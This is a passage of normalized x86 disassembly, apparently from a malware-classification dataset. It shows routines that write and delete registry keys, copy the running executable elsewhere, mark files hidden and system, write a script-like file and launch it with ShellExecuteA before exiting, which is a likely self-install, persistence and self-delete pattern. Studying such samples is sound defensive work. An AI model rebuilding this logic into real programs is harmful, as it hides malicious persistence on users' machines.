call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
mov ecx [ ebp + 0x8 ]
add esp 0xc
call sub_402198
lea ecx [ ebp - 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x40 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
jmp r-xdata
sub_406339
push ebp
mov ebp esp
sub esp 0x30
cmp [ ebp + 0x8 ] 0x1
push ebx
push esi
push edi
mov esi r--data
mov edi rw-data
jne r-xdata
cmp [ ebp + 0xc ] 0x1
jne r-xdata
push 0x1
lea eax [ ebp - 0x10 ]
sub esp 0x10
mov ebx esp
push esi
push edi
push esi
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
push ebx
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push [ ebp + 0x1c ]
push r--data
push 0x80000001
call sub_408fda
add esp 0x20
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
cmp [ ebp + 0x10 ] 0x1
jne r-xdata
push 0x1
lea eax [ ebp - 0x10 ]
sub esp 0x10
mov ebx esp
push esi
push edi
push esi
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
push ebx
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push [ ebp + 0x1c ]
push r--data
push 0x80000002
call sub_408fda
add esp 0x20
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
cmp [ ebp + 0x14 ] 0x1
jne r-xdata
push 0x1
lea eax [ ebp + 0xb ]
sub esp 0x10
lea ecx [ ebp - 0x30 ]
mov ebx esp
push esi
push edi
push esi
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push eax
lea eax [ ebp - 0x10 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push ebx
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push r--data
push r--data
push 0x80000002
call sub_408fda
add esp 0x20
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
cmp [ ebp + 0x18 ] 0x1
jne r-xdata
push 0x1
lea eax [ ebp + 0xb ]
sub esp 0x10
lea ecx [ ebp - 0x10 ]
mov ebx esp
push esi
push edi
push esi
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push eax
lea eax [ ebp - 0x30 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push ebx
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push r--data
push r--data
push 0x80000002
call sub_408fda
add esp 0x20
lea ecx [ ebp - 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop edi
pop esi
pop ebx
leave
retn
push 0x1
lea eax [ ebp - 0x30 ]
sub esp 0x10
mov ebx esp
push esi
push edi
push esi
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
push ebx
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push [ ebp + 0x1c ]
push r--data
push 0x80000002
call sub_408fda
add esp 0x20
lea ecx [ ebp - 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_40650d
push ebp
mov ebp esp
sub esp 0xfc
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
je r-xdata
push [ ebp + 0x10 ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x8 ]
push eax
call sub_40712f
add esp 0xc
mov esi rw-data
mov ecx esi
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x20 ]
push eax
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ CreateDirectoryA@IAT ]
push [ ebp + 0x10 ]
lea eax [ ebp - 0x20 ]
push r--data
push rw-data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push eax
lea eax [ ebp - 0x40 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov esi rw-data
mov ecx esi
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x40 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x20 ]
jmp r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov ebx rw-data
mov edi ebx
push 0x0
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push ebx
call [ CopyFileA@IAT ]
test eax eax
jne r-xdata
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
mov al [ rw-data ]
push eax
mov al [ rw-data ]
push eax
mov al [ rw-data ]
push eax
mov al [ rw-data ]
push eax
mov al [ rw-data ]
push eax
call sub_406339
add esp 0x18
mov al 0x1
jmp r-xdata
xor eax eax
jmp r-xdata
mov dl [ edi + 0x1 ]
mov cl dl
cmp dl [ eax + 0x1 ]
jne r-xdata
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
mov al [ rw-data ]
push eax
mov al [ rw-data ]
push eax
mov al [ rw-data ]
push eax
mov al [ rw-data ]
push eax
mov al [ rw-data ]
push eax
call sub_406339
add esp 0x18
cmp [ ebp + 0x14 ] 0x1
jne r-xdata
cmp [ ebp + 0x8 ] 0x36
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
test eax eax
jne r-xdata
inc edi
inc edi
inc eax
inc eax
test cl cl
jne r-xdata
lea eax [ ebp + 0x17 ]
push r--data
push eax
push r--data
call [ getenv@IAT ]
pop ecx
push eax
lea ecx [ ebp - 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
lea ecx [ ebp - 0x40 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x1
push 0x10
lea ecx [ ebp - 0x40 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea ecx [ ebp - 0xfc ]
call [ std::basic_ofstream<char,struct std::char_traits<char> >::basic_ofstream<char,struct std::char_traits<char> >@IAT ]
mov edi [ std::operator<<@IAT ]
lea eax [ ebp - 0xfc ]
push r--data
push eax
call edi
cmp [ ebp + 0x18 ] 0x1
pop ecx
pop ecx
mov ebx r--data
mov esi r--data
jne r-xdata
push 0x7
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov esi [ SetFileAttributesA@IAT ]
push eax
call esi
mov edi [ ebp + 0xc ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
je r-xdata
mov edi [ ebp + 0xc ]
or ecx 0xffffffff
[ edi ]
push [ ebp + 0x10 ]
not ecx
dec ecx
je r-xdata
mov dl [ edi ]
mov cl dl
cmp dl [ eax ]
jne r-xdata
lea eax [ ebp + 0x17 ]
push ebx
push eax
push esi
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
push rw-data
lea eax [ ebp + 0x1b ]
push esi
push eax
push r--data
lea ecx [ ebp - 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push eax
lea eax [ ebp - 0x50 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x70 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x60 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
push eax
lea eax [ ebp - 0xfc ]
push eax
call ??6std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@@Z
add esp 0x14
lea ecx [ ebp - 0x60 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x70 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x50 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0xfc ]
push r--data
push eax
call edi
lea eax [ ebp - 0xfc ]
push r--data
push eax
call edi
add esp 0x10
lea ecx [ ebp - 0xfc ]
call [ std::basic_ofstream<char,struct std::char_traits<char> >::close@IAT ]
xor esi esi
mov eax r--data
push esi
push eax
push eax
lea ecx [ ebp - 0x40 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push r--data
push esi
call [ ShellExecuteA@IAT ]
cmp eax 0x20
jbe r-xdata
push ebx
lea eax [ ebp + 0x17 ]
push esi
push eax
push rw-data
lea ecx [ ebp - 0x60 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp + 0x1b ]
push esi
push eax
push r--data
lea ecx [ ebp - 0x70 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x50 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push eax
lea eax [ ebp - 0x20 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x30 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push eax
lea eax [ ebp - 0x10 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
push eax
lea eax [ ebp - 0xfc ]
push eax
call ??6std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@@Z
add esp 0x14
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x50 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x70 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x60 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x7
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call esi
lea eax [ ebp - 0x10 ]
push 0x36
push eax
call sub_40712f
add esp 0xc
mov ecx esi
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x10 ]
push r--data
lea eax [ ebp - 0x10 ]
push [ ebp + 0xc ]
push 0x36
push eax
call sub_40712f
add esp 0xc
push eax
lea eax [ ebp - 0x30 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push eax
lea eax [ ebp - 0x20 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov ecx esi
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x10 ]
jmp r-xdata
lea ecx [ ebp - 0xfc ]
call [ std::basic_ofstream<char,struct std::char_traits<char> >::`vector deleting destructor'@IAT ]
lea ecx [ ebp - 0x40 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push esi
call [ exit@IAT ]
push ebx
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
xor al al
jmp r-xdata
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x0
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push ebx
call [ CopyFileA@IAT ]
test eax eax
jne r-xdata
sub_406988
push ebp
mov ebp esp
sub esp 0x1d4
cmp [ rw-data ] 0x1
push ebx
push esi
push edi
jne r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov ecx rw-data
call sub_40524e
cmp [ rw-data ] 0x1
mov ebx rw-data
mov edi r--data
jne r-xdata
call sub_40e4ab
cmp [ rw-data ] 0x1
mov esi 0x80000002
jne r-xdata
mov ecx ebx
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push edi
push 0x80000001
call sub_409132
add esp 0xc
cmp [ rw-data ] 0x1
mov edi r--data
jne r-xdata
mov ecx ebx
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push edi
push esi
call sub_409132
add esp 0xc
cmp [ rw-data ] 0x1
jne r-xdata
push 0x1
lea eax [ ebp - 0x1 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push r--data
push edi
push esi
call sub_408fda
add esp 0x20
cmp [ rw-data ] 0x1
jne r-xdata
push 0x1
lea eax [ ebp - 0x1 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push r--data
push edi
push esi
call sub_408fda
add esp 0x20
and [ ebp - 0x1d4 ] 0x0
push 0x40
pop ecx
xor eax eax
lea edi [ ebp - 0x1d3 ]
mov esi rw-data
[ edi ]
stosw [ edi ]
mov ecx esi
stosb [ edi ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea eax [ ebp - 0x1d4 ]
mov esi rw-data
push eax
push r--data
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov edi 0x80000001
push eax
push edi
call sub_408f64
add esp 0x18
test al al
jne r-xdata
mov ecx ebx
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push r--data
push esi
call sub_409132
add esp 0xc
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push edi
call [ RegDeleteKeyA@IAT ]
lea eax [ ebp - 0x1d4 ]
push 0x104
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
jmp r-xdata
lea eax [ ebp - 0x1d4 ]
push 0x80
push eax
call ebx
test eax eax
jne r-xdata
push 0x80
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call ebx
lea eax [ ebp - 0x1 ]
push r--data
push eax
push r--data
call [ getenv@IAT ]
pop ecx
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x44 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov esi r--data
mov edi rw-data
push esi
push edi
mov [ ebp - 0x1 ] 0x1
call [ std::operator!=@IAT ]
mov ebx [ SetFileAttributesA@IAT ]
pop ecx
test al al
pop ecx
je r-xdata
push 0x1
push 0x10
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea ecx [ ebp - 0xd0 ]
call [ std::basic_ofstream<char,struct std::char_traits<char> >::basic_ofstream<char,struct std::char_traits<char> >@IAT ]
lea ecx [ ebp - 0xd0 ]
call [ std::basic_ofstream<char,struct std::char_traits<char> >::is_open@IAT ]
test al al
je r-xdata
and [ ebp - 0x1 ] al
push 0x0
call [ exit@IAT ]
mov ebx [ std::operator<<@IAT ]
lea eax [ ebp - 0xd0 ]
push r--data
push eax
call ebx
pop ecx
lea eax [ ebp - 0x2 ]
pop ecx
push r--data
push eax
lea eax [ ebp - 0x1d4 ]
lea ecx [ ebp - 0x24 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x34 ]
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0x14 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
push eax
lea eax [ ebp - 0xd0 ]
push eax
call ??6std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@@Z
add esp 0x14
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push esi
push edi
call [ std::operator!=@IAT ]
pop ecx
test al al
pop ecx
je r-xdata
lea eax [ ebp - 0x2 ]
push r--data
push eax
lea eax [ ebp - 0x1d4 ]
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x34 ]
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0x24 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
push eax
lea eax [ ebp - 0xd0 ]
push eax
call ??6std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@@Z
add esp 0x14
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0xd0 ]
push r--data
push eax
call ebx
lea eax [ ebp - 0xd0 ]
push r--data
push eax
call ebx
add esp 0x10
lea ecx [ ebp - 0xd0 ]
call [ std::basic_ofstream<char,struct std::char_traits<char> >::close@IAT ]
push 0x0
push esi
push esi
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push r--data
push 0x0
call [ ShellExecuteA@IAT ]
push r--data
push edi
lea eax [ ebp - 0x34 ]
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0x24 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
push eax
lea eax [ ebp - 0xd0 ]
push eax
call ??6std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@@Z
add esp 0x14
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_406d29
push ebp
mov ebp esp
sub esp 0x1d4
cmp [ rw-data ] 0x1
push ebx
push esi
push edi
jne r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov ecx rw-data
call sub_40524e
cmp [ rw-data ] 0x1
mov ebx rw-data
mov edi r--data
jne r-xdata
call sub_40e4ab
cmp [ rw-data ] 0x1
mov esi 0x80000002
jne r-xdata
mov ecx ebx
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push edi
push 0x80000001
call sub_409132
add esp 0xc
cmp [ rw-data ] 0x1
mov edi r--data
jne r-xdata
mov ecx ebx
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push edi
push esi
call sub_409132
add esp 0xc
cmp [ rw-data ] 0x1
jne r-xdata
push 0x1
lea eax [ ebp - 0x1 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push r--data
push edi
push esi
call sub_408fda
add esp 0x20
cmp [ rw-data ] 0x1
jne r-xdata
push 0x1
lea eax [ ebp - 0x1 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push r--data
push edi
push esi
call sub_408fda
add esp 0x20
mov esi rw-data
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea eax [ ebp - 0x1d4 ]
mov esi rw-data
push eax
push r--data
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov edi 0x80000001
push eax
push edi
call sub_408f64
add esp 0x18
test al al
jne r-xdata
mov ecx ebx
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
